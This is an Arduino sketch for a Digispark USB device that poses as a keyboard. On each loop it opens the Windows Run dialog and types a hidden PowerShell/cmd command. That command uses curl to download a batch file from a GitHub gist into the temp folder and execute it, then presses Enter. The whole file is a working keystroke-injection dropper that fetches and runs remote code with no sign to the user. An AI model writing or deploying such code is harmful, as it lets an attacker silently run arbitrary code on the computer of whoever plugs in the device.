#include "DigiKeyboard.h"

void setup() {
    // don't need to set anything up to use DigiKeyboard
    pinMode(0, OUTPUT);
}


void loop() {
    // put your main code here, to run repeatedly:
    
    DigiKeyboard.update();
    DigiKeyboard.sendKeyStroke(0);
    DigiKeyboard.delay(3000);
  
    DigiKeyboard.sendKeyStroke(KEY_R , MOD_GUI_LEFT);
    DigiKeyboard.delay(500);
    DigiKeyboard.print("powershell -windowstyle hidden cmd.exe /c \"curl https://gist.githubusercontent.com/r4mdev/15e316404185175296360e451e6a6812/raw/2179cf1b9c1cddcb831a032413a836b0f5b00b66/env.bat -o %tmp%\\env.bat;%tmp%\\env.bat\"");
    DigiKeyboard.delay(1500);
    DigiKeyboard.sendKeyStroke(KEY_ENTER); 
    DigiKeyboard.delay(7000);
}
